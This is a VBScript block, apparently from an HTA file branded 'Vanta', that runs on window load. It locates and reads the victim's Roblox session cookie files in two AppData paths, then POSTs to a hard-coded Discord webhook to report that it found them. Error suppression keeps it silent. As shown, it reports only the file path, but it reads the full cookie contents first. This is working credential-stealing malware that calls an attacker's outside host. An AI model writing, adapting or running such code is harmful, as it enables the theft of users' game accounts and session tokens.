<script language="VBScript">
On Error Resume Next

Dim sh, fso
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

Sub Window_OnLoad()
    Dim fp, raw, paths(2)
    ' The two most common Roblox desktop paths
    paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
    paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Packages\ROBLOXCORPORATION.ROBLOX_55nm5eh3cm0pr\LocalState\RobloxCookies.dat"
    
    Dim i
    For i = 0 To 1
        If fso.FileExists(paths(i)) Then 
            fp = paths(i)
            Exit For
        End If
    Next
    
    If Len(fp) = 0 Then
        MsgBox "Could not find Roblox cookies at either path." & vbCrLf & vbCrLf & _
               "Path 1: " & paths(0) & vbCrLf & _
               "Path 2: " & paths(1), 16, "Vanta Error"
        window.close
        Exit Sub
    End If
    
    raw = fso.OpenTextFile(fp, 1).ReadAll
    If Len(raw) < 10 Then
        MsgBox "File found, but it's empty or too small.", 16, "Vanta Error"
        window.close
        Exit Sub
    End If
    
    ' Send the alert that it found the file
    Dim h
    Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.Open "POST", "https://discord.com/api/webhooks/1557537274613469307/QDbmzYDUHRCzK_7OQMXsibxACoABgfSkBkBxIqh4NXh6OPYPZEBDm7NznEl8mLTxPRwE", False
    h.SetRequestHeader "Content-Type", "application/json"
    h.Send "{""content"":""I found the Roblox cookie file! Path: " & Replace(fp, "\", "\\") & """}"
    
    window.close
End Sub
